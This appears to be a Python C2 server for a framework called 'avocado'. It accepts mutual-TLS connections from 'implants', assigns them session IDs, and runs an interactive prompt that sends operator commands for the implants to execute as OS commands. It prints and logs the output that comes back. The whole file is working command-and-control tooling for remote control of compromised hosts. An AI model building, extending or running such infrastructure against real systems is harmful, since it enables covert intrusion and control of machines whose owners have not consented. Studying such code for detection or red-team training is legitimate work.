#!/usr/bin/env python3

import logging
import socket
import ssl
import threading
import uuid
import sys
from pb import implantpb_pb2
from queue import Queue


# A thread safe dict of sessions and their ids
class Sessions:
    def __init__(self):
        self._mutex = threading.Lock()
        self._sessions = dict()

    # Add a connection and an address
    def add(self, conn, addr) -> str:
        # TODO: make sure the id doesn't already exist in the _sessions dict
        self._mutex.acquire()
        id = str(uuid.uuid4())
        self._sessions[id] = (conn, addr)
        self._mutex.release()
        return id

    # Get the connection by the session ID
    def get(self, id):
        self._mutex.acquire()
        conn, addr = self._sessions[id]
        self._mutex.release()
        return (conn, addr)

    # Return a list of session IDs
    def list(self) -> list:
        self._mutex.acquire()
        ids = list(self._sessions.keys())
        self._mutex.release()
        return ids


class Listener:
    def __init__(self, requestq: Queue):
        self.sessions = Sessions()

        certfile = "../certs/server/avocado-server.c2.pem"
        keyfile = "../certs/server/avocado-server.c2-key.pem"
        client_cert = "../certs/client/rootCA.pem"

        # mTLS settings
        ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        ctx.verify_mode = ssl.CERT_REQUIRED
        ctx.load_cert_chain(certfile, keyfile)
        ctx.load_verify_locations(cafile=client_cert)
        # ctx.post_handshake_auth = True

        # Create a secure socket wrapped in mTLS
        ssock = self.mkssock(ctx)
        # start accepting connections
        t = threading.Thread(target=self.accept, args=(ssock, requestq))
        t.start()

    # Create a secure socket
    def mkssock(self, ctx: ssl.SSLContext) -> ssl.SSLSocket:
        # Create a TCP socket
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind(("127.0.0.1", 31337))
            s.listen()
            return ctx.wrap_socket(s, server_side=True)

    # Accept connections from implants
    def accept(self, ssock: ssl.SSLSocket, requestq: Queue):
        while True:
            conn, addr = ssock.accept()
            # conn.verify_client_post_handshake()

            # Send the registration to the handler
            data = conn.recv(1024)
            requestq.put((data, addr))

            # Add the session
            id = self.sessions.add(conn, addr)
            print(f"implant ID: {id}")

            # TODO: Authenticate the implant before sending a confirmation
            confirmation = implantpb_pb2.Message(
                message_type=implantpb_pb2.Message.MessageType.RegistrationConfirmation,
                data=implantpb_pb2.RegistrationConfirmation(id=id).SerializeToString()
            ).SerializeToString()
            conn.sendall(confirmation)

            logging.basicConfig(filename="Command Log.txt", level=logging.INFO)
            logging.info(f"Accepted connection from {addr} | {id}")


# Send data to implant
def session(conn: ssl.SSLContext):
    while True:
        userin = input("[session] > ")
        if userin == "exit":
            break

        # Turn the cmd into a protobuf Message
        os_cmd = implantpb_pb2.OsCmd(cmd=userin)
        message = implantpb_pb2.Message(
            message_type=implantpb_pb2.Message.MessageType.OsCmd,
            data=os_cmd.SerializeToString()
        )
        conn.sendall(message.SerializeToString())
        data = conn.recv(1024)
        if not data:
            break
        else:
            logging.basicConfig(filename="Command Log.txt", level=logging.INFO)
            # Decode the data into OsCmdOutput
            message = implantpb_pb2.Message()
            message.ParseFromString(data)
            if message.message_type == implantpb_pb2.Message.MessageType.OsCmdOutput:
                output = implantpb_pb2.OsCmdOutput()
                output.ParseFromString(message.data)
                logging.info(output.stdout)
                if output.HasField("status") and output.code != 0:
                    print(f"Status code: {output.code}")
                if len(output.stderr) > 0:
                    print("stdout:")
                    sys.stdout.buffer.write(output.stdout)
                    print()
                    print("stderr:")
                    sys.stdout.buffer.write(output.stderr)
                else:
                    sys.stdout.buffer.write(output.stdout)
